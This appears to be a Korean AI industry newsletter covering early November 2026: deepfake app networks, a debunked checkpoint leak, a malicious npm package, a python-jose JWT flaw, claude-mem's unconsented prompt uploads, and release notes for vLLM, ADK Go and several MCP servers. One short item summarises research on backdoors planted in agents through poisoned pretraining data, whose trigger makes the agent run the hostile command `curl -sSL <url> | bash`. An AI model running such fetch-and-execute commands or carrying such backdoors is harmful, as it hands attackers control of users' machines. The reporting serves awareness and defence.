[Proton](https://proton.me/blog/ai-manifesto) (공식) · [404 Media](https://www.404media.co/manifestos-fear-and-loser-thinking-inside-protons-ai-reckoning/) (10-29, 배경) · [반박 글](https://blog.raed.dev/posts/proton-loser-thinking/) · [HN(반박)](https://news.ycombinator.com/item?id=50328488) (163점) · [OccupySaaS](https://occupysaas.com/) · [HN(OccupySaaS)](https://news.ycombinator.com/item?id=50331402) (445점)

### 9. WIRED: 평범한 AI 앱으로 위장한 딥페이크 앱·도메인 400여 개 네트워크

- **원문:** "a network of more than 400 connected domains and apps". 반려동물 사진이나 언어 학습 앱처럼 보이지만, 특정 조건에서 성착취 딥페이크 생성 화면을 몰래 띄운다. 운영 주체로 홍콩 등록 법인 KeLing Technology Limited를 지목했다.
- **플랫폼 대응:** "Apple removed 19 apps from its App Store". Google은 연락 전에 대부분을 내렸다.

[WIRED](https://www.wired.com/story/hundreds-of-mundane-ai-apps-are-hiding-abusive-deepfake-features/) (매체 탐사, 11-02 10:00 UTC)

### 10. 짧게

- **"Mythos급 Anthropic 체크포인트 유출"은 가짜였다:** HF `burner22/numbat`의 토론 #13(11-01 16:29 UTC) 원문: "43 complete tensors — 730,368 BF16 values — can be regenerated bit for bit from their tensor names alone." 텐서 이름을 시드로 한 NumPy 난수였다는 뜻이다. [HF 토론](https://huggingface.co/burner22/numbat/discussions/13) · [HN](https://news.ycombinator.com/item?id=50327240) (35점)
- **악성 패키지:** npm `persona-ai-sdk` 1.0.0이 악성으로 분류됐다(11-02 11:02 UTC). [GHSA-2v69-q2gc-qm5j](https://github.com/advisories/GHSA-2v69-q2gc-qm5j). GitHub에는 "Claude" 이름을 단 "pre-activated" 데스크톱 설치본 저장소가 대량으로 올라와 PowerShell 스크립트 실행을 유도한다(조사 중 관측, 링크는 싣지 않는다). 공식 배포처 밖의 Claude 설치본은 받지 않는다.
- **유럽 슈퍼마켓 냉동고 2차 공격(The Record 11-02 13:34 UTC):** 벨기에 50곳 이상과 아일랜드·에스토니아·네덜란드·룩셈부르크·스웨덴 매장이 당했다. 벨기에 사이버보안센터는 원문: "concerned about the rising number of incidents, partly due to the targeted use of AI"라고 했지만, 이번 공격에 AI가 쓰였는지는 밝히지 않았다. 10월 프랑스 1차 공격의 피해자는 약 700곳이다. [The Record](https://therecord.media/cyberattack-grocery-freezers-europe) · [HN](https://news.ycombinator.com/item?id=50335615) (172점)
- **(AI 밖) python-jose 3.5.0까지(critical):** 길이 0인 HMAC 키를 받아 JWT를 위조할 수 있다. 최신이 3.5.0이라 **수정 릴리스가 없다.** [GHSA-7jv8-hwmh-86qc](https://github.com/advisories/GHSA-7jv8-hwmh-86qc)
- **(창 경계) 사전학습 오염으로 심는 에이전트 백도어:** 사전학습 말뭉치의 0.1%를 오염시킨 4B 에이전트가 트리거를 보면 `curl -sSL <url> | bash`를 실행했다(Pass@32 92.7%). 깨끗한 SFT·DPO·GRPO를 거쳐도 남았다. 오염 비율 0.0005%(문서 2,500개)에서도 트리거 프롬프트의 1.4%에서 발동했다. 논문은 10-27이고 창 안에는 HN 재게시만 있었다. [저자 페이지](https://pbb.sh/research/Agentic-Backdoor/)
- **직전 판 후속 중 새 진전 없음:** 공유 ChatGPT 링크 탈취 체인(OpenAI 추가 발표 없음), robots.txt AI 학습 거부 신호(IETF 초안 -00 그대로), Wiz "Black October"(갱신 없음).
- **다른 섹션으로 옮긴 것:** claude-mem의 프롬프트 무단 업로드는 도구 1번, FastMCP 4.1.5 보안 백포트는 도구 7번이다.

## 써볼 만한 도구

창 안에 정식 릴리스가 없던 곳: Claude Code(2.1.316 이후 없음), Claude Agent SDK, anthropic-sdk, anthropics/skills, Codex CLI(0.167.0 알파만), Gemini CLI(nightly만), opencode, Cline, Aider, Continue, Playwright MCP, github-mcp-server, MCP SDK·servers·Inspector, Ollama, SGLang, MLX, Pydantic AI, LangGraph. Anthropic 플랫폼·OpenAI API 변경 로그도 10-30이 최신이었다.

### 1. (후속) claude-mem v15.8.3: 설치 화면이 동의 없이 최근 30일 프롬프트 원문을 cmem.ai로 올리던 동작을 고쳤다

- **한 줄 설명:** Claude Code용 메모리 플러그인의 개인정보 수정 릴리스다. 직전 판 도구 6번(v15.7.0, 숨은 Codex 실행)에 이어 두 번째로 사용자 모르게 외부로 나가는 동작을 고쳤다.
- **무엇이 문제였나(릴리스 원문):** "The browser setup opened by `npx claude-mem install` (since v15.2.0) scanned local agent histories and uploaded the full text of the last 30 days of prompts, with session IDs, project names, folder paths and timestamps, without asking."
- **제보 이슈 #5176(10-29 03:16 UTC, 조회 시점 open):**
  - 읽은 기록은 Claude Code(`~/.claude/projects/*/*.jsonl`, 하위 에이전트 포함), Codex, Gemini CLI, Antigravity CLI, OpenCode다. 설치 때 고른 도구와 무관하게 읽었다.
  - 화면의 유일한 체크박스는 기본으로 켜져 있었고, 원문: "cmem.ai confirmed that unticking it does not stop the upload."
  - 프롬프트가 간 곳(제보자가 cmem.ai 확인이라며 옮긴 내용): OpenRouter 전역 엔드포인트를 거쳐 `deepseek/deepseek-v4-flash-0731`로 갔다. 요청에 ZDR도 `data_collection: "deny"`도 없었다. 원문: cmem.ai는 "does not know which provider received the prompts".
- **고친 것(원문):** 스캔은 로컬 기록만 읽고 멈춰서 묻는다. 동의 패널이 도구별 프롬프트 개수를 보여 주고, 체크한 도구만 올라간다. "Keep everything local"을 고르면 아무것도 올라가지 않는다. 분석 체크박스는 기본으로 꺼졌고 업로드 동의와 분리됐다.
- **고치지 않은 것(원문):** "Prompts already uploaded by earlier versions are not removed by this update." cmem.ai 서버 쪽 처리와 개인정보처리방침 문구도 이번 변경 밖이다.
- **추천 이유:** v15.2.0 이후 `npx claude-mem install`을 대화형으로 실행했다면 여러 코딩 에이전트의 프롬프트 원문이 이미 외부로 나갔을 수 있다. 업그레이드해도 지워지지 않는다. 프롬프트·경로·프로젝트 이름에 민감 정보가 있었다면 cmem.ai에 삭제를 요청하고, 그 프롬프트에 붙여 넣은 비밀 값은 교체한다. 저장소는 조회 시점 GitHub Trending 2위다.
- **설치/사용:** `npx claude-mem@15.8.3 install` · [v15.8.3 릴리스](https://github.com/thedotmack/claude-mem/releases/tag/v15.8.3) (공식, 11-02 06:26 UTC) · [PR #5220](https://github.com/thedotmack/claude-mem/pull/5220) · [이슈 #5176](https://github.com/thedotmack/claude-mem/issues/5176) (데이터 행방은 커뮤니티 전언)

### 2. vLLM v0.33.0: CUDA 12.9 빌드를 끊고 PyTorch 2.14로 올렸다. 호환성이 바뀌는 항목이 많다

- **한 줄 설명:** 대표 오픈 추론 서버의 정기 릴리스다. 원문: "This release features 927 commits from 389 contributors (122 new)!"
- **새것(원문):**
  - 새 모델 지원: Reflection Beam-1.0(501B MoE, 23B active), Muse Spark Open, Step-5 Preview, NVIDIA Alpamayo 2 Super 등.
  - OpenAI 호환 `/v1/decisions` 엔드포인트가 지원 모델에서 기본으로 켜진다. `/v1/embeddings`에 토큰 임베딩이 생겼다.
  - AWS EFA용 `vllm/vllm-openai:v0.33.0-efa` 이미지가 생겼다.
  - NVIDIA 디코드 가속: GB300에서 Kimi-K3 "1.5-2x at TP8/TP16", DeepSeek-V4.1-Flash "18.3% faster decode step at batch 1"(PR 측정, opt-in).
- **업그레이드 함정(원문):**
  - "CUDA 12.9 dropped": 휠과 이미지는 CUDA 13.0 전용이다. `-cu129` 이미지는 더 나오지 않는다. PyTorch 2.14.0, Triton 3.8.0으로 올랐다.
  - Medusa와 MLP speculator, 레거시 Ray compiled-graph executor가 삭제됐다.
  - 생성이 일시 중지된 동안 들어온 요청은 이제 HTTP 503을 받는다. NIXL connector는 NIXL 1.5 이상이 필요하다.
- **보안 대조:** 창 안 vLLM 저장소 권고는 없다. 최근 권고(10-20·10-27 게시)는 0.31.0·0.32.0에서 고쳐졌으므로 0.33.0에 포함된다.
- **설치/사용:** `pip install -U vllm` · [릴리스](https://github.com/vllm-project/vllm/releases/tag/v0.33.0rc3) (공식, 11-02 10:10 UTC. 태그 이름은 rc3이지만 제목 v0.33.0, prerelease 아님) · [PyPI](https://pypi.org/project/vllm/0.33.0/)

### 3. Google ADK Go v2.7.0: Claude를 일급 모델로 넣었고, 큰 MCP 카탈로그용 도구 검색이 생겼다

- **한 줄 설명:** Google Agent Development Kit의 Go판. 원문: "adds Anthropic Claude as a first-party model, search-gated tool discovery for large tool catalogs, an experimental classifier API for workflow routing, and a per-invocation budget on model calls."
- **새 기능(원문):**
  - `tool/toolsearch`: 모델은 `search_tools`와 핵심 도구만 들고 시작하고, 찾은 도구는 다음 단계부터 선언된다. "This keeps a large MCP catalog out of every request."
  - MCP `Config.Auth`를 설정하면 사용자마다 MCP 세션이 따로 생긴다. 세션을 연 사용자에게 묶는 서버가 다른 사용자에게 403을 내던 문제가 없어진다.
- **추천 이유:** Go 에이전트에서 Gemini와 Claude를 섞어 쓰거나 MCP 도구가 많은 경우, 컨텍스트를 아끼는 도구 검색을 프레임워크 기본 기능으로 쓸 수 있다.
- **함정(원문의 호환성 변경):**
  - "Model calls are capped at 500 per invocation". 넘으면 `agent.ErrLLMCallsLimitExceeded`로 끝난다. `-1`이 무제한이고, 원문: "Unlike adk-python, `0` means the default, not unlimited."
  - 텔레메트리가 새 형식으로 바뀌었다. `ADK_TELEMETRY_SCHEMA_VERSION_OPT_IN=otel_semconv_1_36`으로 되돌릴 수 있고, "supported until at least March 31, 2027"이다.
  - Go 1.26.10이 필요하다.
- **설치/사용:** [릴리스](https://github.com/google/adk-go/releases/tag/v2.7.0) (공식, 11-02 10:37 UTC)

### 4. Microsoft Visio Desktop MCP Server (프리뷰): AI 클라이언트에서 진짜 Visio 다이어그램을 만들고 고친다

- **한 줄 설명:** NuGet 패키지 `Microsoft.Visio.Mcp`. Windows의 Visio Desktop을 stdio MCP 서버로 자동화한다. 도구는 8개다.
- **추천 이유:** 아키텍처·흐름도를 그림 파일이 아니라 편집 가능한 Visio 문서로 받아야 하는 조직에 맞다. VS Code, Claude Desktop, Copilot Desktop, ChatGPT Desktop·Codex 등의 설정 경로와 예시가 문서에 있다.
- **주의(문서 원문):**
  - "Preview: for evaluation, not production or critical workloads."
  - 라이선스된 Visio Desktop과 .NET 10 SDK가 필요하다. "Don’t start it in WSL, a development container, an SSH session, or a cloud workspace."
  - "The default output folder isn’t an access boundary." 서버는 Windows 계정 권한으로 파일을 읽고 쓴다.
  - "Required-tier diagnostics are permitted unless Office diagnostic data is fully disabled." 또 "Local automation also doesn’t mean model processing stays on your device"라고 적었다.
  - 공식 발표 글은 찾지 못했다. MCP 레지스트리 첫 게시(11-02 14:18 UTC)와 NuGet 등재로 확인했다.
- **설치/사용:** 클라이언트 설정에 `"command": "dnx", "args": ["Microsoft.Visio.Mcp", "--prerelease"]` · [문서](https://microsoft.github.io/Visio-Desktop-MCP-Server/) · [NuGet](https://www.nuget.org/packages/Microsoft.Visio.Mcp) (공식 패키지)

### 5. Grafana MCP v2.2.0: CloudWatch 로그와 쿼리 가드레일이 생겼다. 쿼리 경로가 바뀌는 호환성 변경이 크다

- **새 기능(원문):**
  - 선택 카테고리 `cloudwatch`에 Logs Insights 도구 3개. 행 상한은 기본 100, 최대 1000이다.
  - 데이터소스가 `grafana://datasources/{uid}` MCP 리소스로 노출돼, 원문대로 "such as `@` in Claude Code"로 대화에 붙일 수 있다.
  - Prometheus 쿼리 가드레일 `--prometheus-guardrail-mode=shadow|enforce`. 기본 최대 범위 `192h`, 시리즈당 최대 포인트 `11000`이다.
- **추천 이유:** 장애 조사 에이전트가 비싼 PromQL 쿼리를 날리는 일을 서버 쪽에서 막는다. shadow 모드로 먼저 걸리는 쿼리를 보고 enforce로 넘어가면 된다.
- **함정(원문의 Breaking):** 데이터소스 쿼리가 `/api/ds/query`로 간다. Grafana 9.0 미만은 지원하지 않고, 쿼리 권한이 없는 토큰은 이제 Grafana 오류를 받는다. `query_prometheus`는 더는 App을 직접 띄우지 않고 `render_grafana_app`을 따로 쓴다.
- **설치/사용:** [릴리스](https://github.com/grafana/mcp-grafana/releases/tag/v2.2.0) (공식, 11-02 13:00 UTC)

### 6. Google Agent Mesh v0.2.0: 메시 안의 MCP·A2A·추론 서비스를 외부 HTTP로 노출한다

- **한 줄 설명:** 에이전트용 사설 네트워크(노드·라우터·컨트롤 플레인). 원문: "a router can now expose `a2a`, `mcp` and `inference` services to HTTP clients outside the mesh, under the same identity and policy checks that apply inside it." Go 임베드 SDK `sdk/meshnet`도 생겼다.
- **함정(원문):** 컨트롤 플레인 DB가 스키마 21로 자동 마이그레이션된다. "Do not downgrade a migrated database to v0.1.1 … a policy save from it removes every `allowed_ingress` grant. Take a backup before upgrading." 프록시 뒤의 `agentmesh-one`(Cloud Run 포함)은 이제 `--external-url`이 필요하다.
- **주의:** Google 조직 저장소지만 공식 지원 제품이 아니고 pre-1.0이다. 10-20 판에서 이 프로젝트의 인증 우회 CVE 2건을 다뤘다. 외부 노출은 기본으로 꺼져 있으니 정책을 확인한 뒤 연다.
- **설치/사용:** [릴리스](https://github.com/google/agentmesh/releases/tag/v0.2.0) (11-02 14:25 UTC)

### 7. pi v1.5.0과 FastMCP 4.1.5: 도구 인자 검증 동작이 바뀌었다

- **pi v1.5.0(11-02 11:05 UTC):** 확장으로 고쳐 쓰는 오픈소스 코딩 에이전트다. GPT-6.1 Terra를 OpenAI·Azure·Codex 경로로 지원한다(원문: "Codex offers a 500K context window"). `PI_SELF_UPDATE_COMMAND`로 업데이트 명령을 바꿀 수 있다. **Breaking:** 도구 인자 검증이 `@earendil-works/pi-schema`로 바뀌어 `Type.Refine()` 같은 TypeBox 전용 기능이 더는 적용되지 않는다. 원문: "Plain JSON Schema tools, including MCP tools, now get the same coercion as TypeBox tools". 확장 작성자는 검증 동작을 다시 확인한다. [릴리스](https://github.com/earendil-works/pi/releases/tag/v1.5.0)
- **FastMCP 4.1.5(11-01 20:52 UTC):** 원문: "Twelve fixes backported from main onto the new `release/4.1` line". 보안 항목은 마운트된 리소스 템플릿이 리스트형 쿼리 파라미터를 유지하게 한 수정 하나다(공개 권고는 없다). 동작 변경: JSON Schema `const`·`enum`을 JSON 동등성으로 비교해 "`true` no longer passes for `1`", 인자가 빠진 prompt는 invalid params를 돌려준다. 같은 날 4.2.0a2(프리뷰)에서 Skills를 프록시·마운트 서버로 찾는 기능이 실험으로 들어갔다. `pip install -U "fastmcp==4.1.5"` · [4.1.5](https://github.com/PrefectHQ/fastmcp/releases/tag/v4.1.5) · [4.2.0a2](https://github.com/PrefectHQ/fastmcp/releases/tag/v4.2.0a2)

### 짧게

- **LangChain(11-02 15:2x UTC):** 원문: "Python 3.10 support will be dropped in `langchain-core` 1.8.0 and `langchain` 1.5.0." langchain-anthropic 1.7.8은 compaction 블록의 index를 빼고 null cache-creation 토큰 수를 처리한다. [core 1.7.4](https://github.com/langchain-ai/langchain/releases/tag/langchain-core%3D%3D1.7.4) · [anthropic 1.7.8](https://github.com/langchain-ai/langchain/releases/tag/langchain-anthropic%3D%3D1.7.8)
- **Mastra `@mastra/core` 1.81.0(11-02 12:33 UTC):** `@mastra/mcp`에 저장소 기반 MCP tasks(실험)가 생겼고, `@mastra/core/network/vNext` 경로가 삭제됐다. [릴리스](https://github.com/mastra-ai/mastra/releases/tag/%40mastra%2Fcore%401.81.0)
- **Composio CLI 0.6.0(11-01 21:52 UTC):** 원문: "Scripts must handle the new interruption exit codes"(SIGINT 130, SIGTERM 143, SIGHUP 129). [릴리스](https://github.com/ComposioHQ/composio/releases/tag/%40composio%2Fcli%400.6.0)
- **(후속) Prospero v0.11.0(11-02 04:10 UTC):** 직전 판 도구 4번의 C++ 코딩 하네스에 Docker·Podman 세션 컨테이너가 생겼다. 문서 원문: 컨테이너는 "`--network none` unless asked"로 만든다. 무료판에서 쓸 수 있는지는 확인하지 못했다. [릴리스](https://github.com/skeeto/prospero/releases/tag/v0.11.0) · [remote.md](https://github.com/skeeto/prospero/blob/v0.11.0/docs/remote.md)
- **OpenAI Python SDK 3.42.1(11-01 20:56 UTC):** Responses WebSocket 연결 관련 버그 수정판. [릴리스](https://github.com/openai/openai-python/releases/tag/v3.42.1)

## 주목할 점

- **비용이 요금제를 끌고 가고 있다.** Anthropic은 공시에서 비싼 단기 컴퓨트 때문에 영업적자로 돌아섰다고 적었고, 약 8,954억 달러의 장기 약정을 처음 숫자로 밝혔다. 같은 주말 OpenAI는 채팅과 Codex의 사용량 공유를 12월보다 앞당길 수 있는 문구를 이메일에 썼고, Musk는 Grok Bot의 서빙 비용이 감당할 수 없는 수준이었다고 했다. 다음에 볼 것은 Mythos 5.5·GPT-6.2 Astra가 어떤 가격과 접근 조건으로 나오는지, Anthropic이 공모가 범위를 채울 때 컴퓨트 조달 계획을 어떻게 설명하는지다.
- **비밀과 프롬프트가 모이는 곳이 계속 새고 있다.** 개발 플랫폼의 환경 변수(Trigger.dev), 코딩 에이전트 플러그인의 설치 화면(claude-mem), LLM 코드 샌드박스(prefab-ui)가 같은 창에 나왔다. 다음에 볼 것은 Trigger.dev·Northflank의 침해 경로 공개, Ubuntu의 CVE-2026-98432 보안 업데이트 배포, cmem.ai가 이미 올라간 프롬프트를 어떻게 처리하는지다.

## 조사 제약

- **본문을 직접 읽지 못한 원문:** openai.com은 403이라 r.jina.ai로 읽었다. WSJ(401)는 OpenAI 라운드 갱신 기사 본문을 확인하지 못했다. Forbes·PCMag(CAPTCHA), Axios(403)는 2차 보도로 대신했다. The Hacker News와 BleepingComputer·SecurityWeek 피드는 Cloudflare 차단이라 r.jina.ai로 확인했고, Langflow 후속 기사(THN)는 본문을 읽지 못해 싣지 않았다. Kevin Beaumont 원문(doublepulsar)은 403이었다. The Register Atom 피드가 비어 있었다.
- **시각이 날짜만 있는 원문:** OpenAI Grid Protectors(RSS 정각 값), GPT-Rosalind-6 시스템 카드(10-30), xAI 워터마크 문서(10-31), 사전학습 백도어 논문(10-27). Northflank 상태 페이지 갱신과 Ubuntu Launchpad 빌드 시각은 서브에이전트 조회 값이다.
- **확인하지 못한 것:**
  - Mythos 5.5·Fable 5.5의 출시 시점, GPT-6.2 Astra 응답 이벤트 원본.
  - Grok Bot 한도가 실제로 줄었는지(공식 요금제 문서 미확인).
  - Trigger.dev 침해 경로와 피해 조직 수, Northflank RCA, claude-mem 업로드 데이터가 어느 추론 공급자에게 갔는지(cmem.ai도 모른다고 했다는 제보자 전언뿐이다).
  - Atlas가 주장한 CVE-2026-98432 PoC 저장소 수.
- **놓쳤을 수 있는 범위:**
  - HN: 창 안 스토리 928개를 키워드와 점수순으로 훑었다.
  - 전역 GHSA: reviewed가 10-30 이후 0건이라 unreviewed 239건·malware 32건을 키워드로 걸렀고, 재현하지 않았다.
  - MCP 레지스트리는 창 안 게시 3,499건 중 대형 벤더 네임스페이스만 봤다. Product Hunt는 403이었다.
  - 중국 랩의 WeChat 공지와 x.com 타임라인은 직접 보지 못했다. Vertex AI 릴리스 노트는 캐시가 묵어 보지 않았다.
- **자사 측정:** GDPx 점수, Mistral Large 4 벤치마크, vLLM 디코드 가속 수치, Trail of Bits 백포트 수치, 사전학습 백도어 실험은 모두 각 회사·저자 측정이며 독립 검증 전이다.
